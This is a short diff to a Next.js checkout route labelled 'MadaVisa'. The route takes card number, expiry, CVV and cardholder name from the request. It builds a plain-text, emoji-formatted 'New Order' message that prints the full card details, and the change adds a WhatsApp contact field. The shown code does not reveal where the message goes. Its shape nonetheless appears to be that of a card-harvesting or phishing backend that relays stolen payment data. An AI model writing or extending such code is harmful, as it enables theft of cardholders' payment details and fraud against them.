@@ -1,7 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, installmentType, downPayment } = await req.json();
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, installmentType, downPayment } = await req.json();
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
 
@@ -24,6 +24,7 @@ export async function POST(req: NextRequest) {
     ``,
     `💳 MadaVisa - New Order`,
     `👤 Order For: ${customer ?? "-"}`,
+    `📱 WhatsApp: ${whatsapp ?? "-"}`,
     `💳 Card Number: ${cardNumber}`,
     `👤 Card Holder: ${cardHolder}`,
     `📅 Valid To: ${expiry}`,
